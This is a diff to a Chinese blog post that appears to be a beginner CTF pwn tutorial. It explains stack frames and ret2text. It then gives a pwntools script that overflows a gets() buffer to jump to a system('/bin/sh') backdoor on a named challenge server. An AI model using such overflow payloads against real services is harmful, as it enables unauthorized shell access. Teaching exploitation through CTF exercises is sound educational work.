@@ -29,8 +29,9 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/QYQS1/picture/main/test/202412302222501.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/QYQS1/picture/main/test/202412302225340.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/QYQS1/picture/main/test/202412302228606.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/QYQS1/picture/main/test/202412302333983.png">
 <meta property="article:published_time" content="2024-12-27T02:38:09.000Z">
-<meta property="article:modified_time" content="2024-12-30T15:10:43.140Z">
+<meta property="article:modified_time" content="2024-12-30T15:50:25.646Z">
 <meta property="article:author" content="QYQS">
 <meta property="article:tag" content="二进制">
 <meta property="article:tag" content="伪教程">
@@ -228,7 +229,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.7k 字
+          3.1k 字
         
       </span>
     
@@ -239,7 +240,7 @@
         
         
         
-          23 分钟
+          27 分钟
         
       </span>
     
@@ -379,7 +380,7 @@
 </blockquote>
 <p>–摘录自2024moectf入门文档</p>
 <h1 id="PWN-0x01"><a href="#PWN-0x01" class="headerlink" title="PWN-0x01"></a>PWN-0x01</h1><p>解锁本部分请先完成:</p>
-<p>基础:C语言基础  IDA使用基础  简单汇编基础  栈基本了解</p>
+<p>基础:C语言基础  IDA使用基础  简单汇编基础  栈基本了解  pwntools</p>
 <p><strong>以下内容均建立在对基础知识有所了解的情况下展开  请善用搜索引擎</strong></p>
 <p>在开始整个部分之前  我们先来看一段代码</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-type">int</span> a = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">int</span> input;<br>	<span class="hljs-built_in">scanf_s</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;input);<br>	<span class="hljs-keyword">if</span> (input == <span class="hljs-number">666</span>)<br>	&#123;<br>		a = <span class="hljs-number">1</span>;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (a == <span class="hljs-number">1</span>)<br>	&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flag is:FLAG&#123;@Y@S_i5_G0od_R1ght?&#125;&quot;</span>);<br>	&#125;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;maybe you can&#x27;t good&quot;</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
@@ -434,6 +435,30 @@
 <p>我们刚刚提到过  返回地址在调用函数时会被压入栈中我们只需要控制栈就能控制返回地址</p>
 <p>栈上有些什么呢??  排放顺序如何呢??</p>
 <p><strong>思考ing</strong></p>
+<p>从一个栈帧看起 从高地址向低地址(rbp–&gt;rsp)依次是返回地址+旧的rbp值+局部变量</p>
+<p>如果我们通过写入很长很长的局部变量  计算好偏移  就能覆盖到返回地址处  就实现了所谓的ret2text(无保护情况下)</p>
+<p>理论形成  实践开始  公式题真能秒</p>
+<p>看题  </p>
+<p><strong>例如2024极客大挑战题目:你会栈溢出吗</strong></p>
+<p>开始套公式</p>
+<p>1.寻找backdoor–查看函数表</p>
+<p><img src="https://raw.githubusercontent.com/QYQS1/picture/main/test/202412302333983.png" srcset="/img/loading.gif" lazyload alt="QQ_1735572788188"></p>
+<p>顺着main函数看逻辑 只有key函数未被调用 并且key函数内容为</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">__int64</span> <span class="hljs-function"><span class="hljs-title">key</span>()</span><br>&#123;<br>  <span class="hljs-function"><span class="hljs-title">printf</span>(<span class="hljs-string">&quot;yes,yes,this is key.you can catch me?&quot;</span>);</span><br><span class="hljs-function">  <span class="hljs-title">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);</span><br><span class="hljs-function">  <span class="hljs-variable">return</span> <span class="hljs-number">0</span><span class="hljs-variable">LL</span>;</span><br><span class="hljs-function">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>打开了一个shell,完美符合第一点</p>
+<p>接下来我们就要控制返回地址  就需要寻找溢出点</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">int <span class="hljs-built_in">welcome</span>()<br>&#123;<br>  char v1<span class="hljs-selector-attr">[12]</span>; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(&quot;Welcome to geek,what&#x27;s you name?&quot;);<br>  <span class="hljs-built_in">gets</span>(v1);<br>  return <span class="hljs-built_in">printf</span>(&quot;hello,%s\nDo you know key?&quot;, v1);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>welcome函数中很明显的危险函数gets</p>
+<p>gets在读取数据时是不会检查长度的   能写入很长很长的数据来覆盖到返回地址  套公式成功</p>
+<p>接下来就是算偏移 这个函数只有一个局部变量 v1数组  大小为12</p>
+<p>那么此时该函数的栈帧组成为返回地址+8字节的旧rbp值+12字节的数组空间</p>
+<p>所以我们需要输入的数据为12+8+返回地址就能解决该题</p>
+<p>但是返回地址我们并不能手动输入进去  因为会被解释为字符串而不是字节  所以我们需要用到pwntools库</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><span class="hljs-keyword">a</span>=remote(<span class="hljs-string">&quot;nc1.ctfplus.cn&quot;</span>,<span class="hljs-number">47014</span>)<br><span class="hljs-keyword">a</span>.recvline()<br>payload=b<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">12</span>+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0x40073D</span>)<br><span class="hljs-keyword">a</span>.sendline(payload)<br><span class="hljs-keyword">a</span>.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>a.interactive()来获取交互 因为此时你已经打开了一个shell  你就能得到flag了</p>
 <p>(未完待续….)</p>
 
                 
